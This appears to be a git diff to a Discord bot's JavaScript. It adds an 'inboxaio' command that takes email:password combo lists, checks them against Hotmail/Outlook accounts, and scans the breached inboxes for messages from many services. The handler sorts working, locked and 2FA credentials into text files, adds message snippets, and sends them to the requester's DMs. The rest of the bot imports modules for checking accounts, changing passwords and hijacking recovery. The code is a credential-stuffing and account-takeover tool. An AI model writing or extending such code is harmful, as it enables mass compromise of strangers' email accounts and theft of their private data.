@@ -13,6 +13,7 @@ const { sendToWebhook } = require("./utils/webhook");
 const { checkCodes } = require("./utils/microsoft-checker");
 const { claimWlids } = require("./utils/microsoft-claimer");
 const { pullCodes, pullLinks } = require("./utils/microsoft-puller");
+const { checkInboxAccounts, getServiceCount } = require("./utils/microsoft-inbox");
 const { searchProducts, getProductDetails, purchaseItems } = require("./utils/microsoft-purchaser");
 const { changePasswords, checkAccounts } = require("./utils/microsoft-changer");
 const { initiateRecovery, submitCaptchaAndContinue, submitNewPassword, downloadCaptchaImage } = require("./utils/microsoft-recover");
@@ -28,6 +29,8 @@ const {
   pullResultsEmbed,
   promoPullerFetchProgressEmbed,
   promoPullerResultsEmbed,
+  inboxAioProgressEmbed,
+  inboxAioResultsEmbed,
   purchaseResultsEmbed,
   purchaseProgressEmbed,
   productSearchEmbed,
@@ -1254,6 +1257,199 @@ async function handleRewards(respond, userId, accountsRaw, accountsFile, threads
   }
 }
 
+// ── Inbox AIO handler ────────────────────────────────────────
+
+async function handleInboxAio(respond, userId, accountsRaw, accountsFile, threads = 5, dmUser = null) {
+  if (!canUse(userId)) return respond({ embeds: [errorEmbed(blacklist.isBlacklisted(userId) ? "You are blacklisted." : "You are not authorized to use this bot.")] });
+
+  const acquire = limiter.acquire(userId, "inboxaio");
+  if (!acquire.ok) {
+    const reason = acquire.reason === "busy"
+      ? "You already have a command running. Wait for it to finish."
+      : `Max concurrent users (${config.MAX_CONCURRENT_USERS}) reached. Try again later.`;
+    return respond({ embeds: [errorEmbed(reason)] });
+  }
+
+  const ac = new AbortController();
+  activeAborts.set(userId, ac);
+
+  try {
+    let accounts = splitInput(accountsRaw).filter((a) => a.includes(":"));
+    if (accountsFile) {
+      const lines = await fetchAttachmentLines(accountsFile);
+      accounts = accounts.concat(lines.filter((l) => l.includes(":")));
+    }
+
+    if (accounts.length === 0) return respond({ embeds: [errorEmbed("No valid accounts provided (email:password format).")] });
+    if (accounts.length > MAX_COMBO_LINES) return respond({ embeds: [errorEmbed(`Too many accounts. Max ${MAX_COMBO_LINES} lines allowed.`)] });
+
+    const startTime = Date.now();
+    let totalServicesFound = 0;
+
+    const msg = await respond({
+      embeds: [inboxAioProgressEmbed({ completed: 0, total: accounts.length, hits: 0, fails: 0, elapsed: 0, servicesFound: 0 })],
+      components: [stopButton(userId)],
+      fetchReply: true,
+    });
+
+    let lastUpdate = Date.now();
+    const results = await checkInboxAccounts(accounts, threads, (done, total, status, hits, fails, lastResult) => {
+      if (lastResult) {
+        const svcCount = Object.keys(lastResult.services || {}).length;
+        totalServicesFound += svcCount;
+      }
+      const now = Date.now();
+      if (now - lastUpdate > 2500) {
+        lastUpdate = now;
+        updateProgress(msg, inboxAioProgressEmbed({
+          completed: done,
+          total,
+          hits: hits || 0,
+          fails: fails || 0,
+          elapsed: Date.now() - startTime,
+          latestAccount: lastResult?.user || "",
+          latestStatus: status || "",
+          servicesFound: totalServicesFound,
+        }), userId);
+      }
+    }, ac.signal);
+
+    const stopped = ac.signal.aborted;
+    const elapsed = Date.now() - startTime;
+
+    // Categorize results
+    const hitResults = results.filter(r => r.status === "hit");
+    const failResults = results.filter(r => r.status === "fail");
+    const lockedResults = results.filter(r => r.status === "locked" || r.status === "custom");
+    const twoFAResults = results.filter(r => r.status === "2fa");
+
+    // Build service breakdown (how many accounts have each service)
+    const serviceBreakdown = {};
+    for (const r of hitResults) {
+      for (const [svcName] of Object.entries(r.services || {})) {
+        serviceBreakdown[svcName] = (serviceBreakdown[svcName] || 0) + 1;
+      }
+    }
+
+    // Build per-service file content
+    const serviceFiles = {}; // { serviceName: [ "email:pass | captures..." ] }
+    for (const r of hitResults) {
+      for (const [svcName, svcData] of Object.entries(r.services || {})) {
+        if (!serviceFiles[svcName]) serviceFiles[svcName] = [];
+        let line = `${r.user}:${r.password}`;
+        if (svcData.count) line += ` | Msgs: ${svcData.count}`;
+        if (svcData.date) line += ` | Last: ${svcData.date}`;
+        if (svcData.snippet) line += ` | ${svcData.snippet.slice(0, 80)}`;
+        serviceFiles[svcName].push(line);
+      }
+    }
+
+    // Build ZIP-like structure using multiple txt files grouped
+    // Discord doesn't support ZIP natively, so we send organized txt files
+    const { AttachmentBuilder } = require("discord.js");
+    const files = [];
+
+    // Summary file
+    const summaryLines = [
+      `Inbox AIO Results`,
+      `==================`,
+      `Total: ${results.length} | Hits: ${hitResults.length} | Failed: ${failResults.length}`,
+      `Locked: ${lockedResults.length} | 2FA: ${twoFAResults.length}`,
+      `Elapsed: ${Math.round(elapsed / 1000)}s`,
+      ``,
+      `Services Found:`,
+    ];
+    const sortedSvc = Object.entries(serviceBreakdown).sort((a, b) => b[1] - a[1]);
+    for (const [svc, count] of sortedSvc) {
+      summaryLines.push(`  ${svc}: ${count} accounts`);
+    }
+    files.push(textAttachment(summaryLines, "00_summary.txt"));
+
+    // Per-service files (grouped by category for organization)
+    const categoryGroups = {};
+    for (const [svcName, lines] of Object.entries(serviceFiles)) {
+      // Find category
+      const svcDef = require("./utils/microsoft-inbox").SERVICES.find(s => s.label === svcName);
+      const cat = svcDef?.category || "Other";
+      if (!categoryGroups[cat]) categoryGroups[cat] = {};
+      categoryGroups[cat][svcName] = lines;
+    }
+
+    for (const [cat, svcs] of Object.entries(categoryGroups)) {
+      for (const [svcName, lines] of Object.entries(svcs)) {
+        if (lines.length > 0) {
+          const safeName = svcName.replace(/[^a-zA-Z0-9]/g, "_").toLowerCase();
+          files.push(textAttachment(lines, `${cat}_${safeName}.txt`));
+        }
+      }
+    }
+
+    // All hits combined
+    if (hitResults.length > 0) {
+      const allHitLines = hitResults.map(r => {
+        const svcs = Object.keys(r.services || {}).join(", ");
+        const caps = Object.entries(r.captures || {}).map(([k, v]) => `${k}: ${v}`).join(" | ");
+        return `${r.user}:${r.password}${svcs ? ` | Services: ${svcs}` : ""}${caps ? ` | ${caps}` : ""}`;
+      });
+      files.push(textAttachment(allHitLines, "all_hits.txt"));
+    }
+
+    // Failed
+    if (failResults.length > 0) {
+      files.push(textAttachment(failResults.map(r => `${r.user}:${r.password} | ${r.detail || "failed"}`), "failed.txt"));
+    }
+
+    // Locked / 2FA
+    if (lockedResults.length > 0) {
+      files.push(textAttachment(lockedResults.map(r => `${r.user}:${r.password}`), "locked.txt"));
+    }
+    if (twoFAResults.length > 0) {
+      files.push(textAttachment(twoFAResults.map(r => `${r.user}:${r.password}`), "2fa.txt"));
+    }
+
+    const embed = inboxAioResultsEmbed({
+      total: results.length,
+      hits: hitResults.length,
+      fails: failResults.length,
+      locked: lockedResults.length,
+      twoFA: twoFAResults.length,
+      elapsed,
+      serviceBreakdown,
+      username: dmUser?.username,
+    });
+    if (stopped) embed.setDescription(embed.data.description + "\n\n*Stopped -- partial results*");
+
+    // Discord file limit is 10 per message, split if needed
+    const maxFilesPerMsg = 10;
+    if (dmUser) {
+      try {
+        // Send results to DMs in batches
+        for (let i = 0; i < files.length; i += maxFilesPerMsg) {
+          const batch = files.slice(i, i + maxFilesPerMsg);
+          if (i === 0) {
+            await dmUser.send({ embeds: [embed], files: batch });
+          } else {
+            await dmUser.send({ files: batch });
+          }
+        }
+        await msg.edit({ embeds: [infoEmbed("Inbox AIO Complete", `Scanned ${results.length} accounts across ${getServiceCount()} services. Results sent to your DMs.`)], components: [] });
+      } catch {
+        await msg.edit({ embeds: [embed], files: files.slice(0, maxFilesPerMsg), components: [] });
+      }
+    } else {
+      await msg.edit({ embeds: [embed], files: files.slice(0, maxFilesPerMsg), components: [] });
+    }
+
+    statsManager.record(userId, "inboxaio", hitResults.length);
+
+  } catch (err) {
+    await respond({ embeds: [errorEmbed(`Unexpected error: ${err.message}`)] });
+  } finally {
+    activeAborts.delete(userId);
+    limiter.release(userId);
+  }
+}
+
 // ── Slash Commands ───────────────────────────────────────────
 
 client.on("interactionCreate", async (interaction) => {
@@ -1330,6 +1526,14 @@ client.on("interactionCreate", async (interaction) => {
       const accounts = interaction.options.getString("accounts");
       const accountsFile = interaction.options.getAttachment("accounts_file");
       await handlePromoPuller(respond, user.id, accounts, accountsFile, user, user.username);
+    }
+
+    else if (commandName === "inboxaio") {
+      await interaction.deferReply();
+      const accounts = interaction.options.getString("accounts");
+      const accountsFile = interaction.options.getAttachment("accounts_file");
+      const threads = interaction.options.getInteger("threads") || 5;
+      await handleInboxAio(respond, user.id, accounts, accountsFile, threads, user);
     }
 
     else if (commandName === "wlidset") {
@@ -1504,6 +1708,15 @@ client.on("messageCreate", async (message) => {
         return respond({ embeds: [infoEmbed("Usage", "`.promopuller <accounts>`\nProvide email:password comma-separated or attach a `.txt` file.\nPulls promo links only. Results sent to your DMs.")] });
       }
       await handlePromoPuller(respond, message.author.id, accountsRaw, attachment, message.author, message.author.username);
+    }
+
+    else if (cmd === "inboxaio") {
+      const accountsRaw = args.join(" ");
+      const attachment = message.attachments.first();
+      if (!accountsRaw && !attachment) {
+        return respond({ embeds: [infoEmbed("Usage", `\`.inboxaio <accounts>\` or attach a .txt file\n\nScans Hotmail/Outlook inboxes for ${getServiceCount()}+ services.\nResults sent to your DMs as organized files.`)] });
+      }
+      await handleInboxAio(respond, message.author.id, accountsRaw, attachment, 5, message.author);
     }
 
     else if (cmd === "wlidset") {
